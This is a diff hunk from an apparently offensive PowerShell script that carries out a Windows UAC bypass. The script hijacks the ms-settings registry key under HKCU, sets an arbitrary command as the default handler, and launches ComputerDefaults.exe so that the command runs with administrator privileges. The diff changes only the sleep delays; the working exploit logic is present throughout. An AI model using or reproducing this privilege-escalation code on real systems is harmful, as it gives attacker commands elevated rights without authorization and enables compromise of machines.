@@ -141,13 +141,13 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    ## Add Entrys to Regedit { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe execution in registry."
    # New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
-   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 380
+   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 200
    ## The Next Registry entry allow us to execute our command under high privileges (Admin)
-   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 380
+   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 200
 
    ## Start the vulnerable Process { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe process execution."
-   Start-Sleep -Milliseconds 2700;Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
+   Start-Sleep -Milliseconds 2500;Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
    ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
    If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
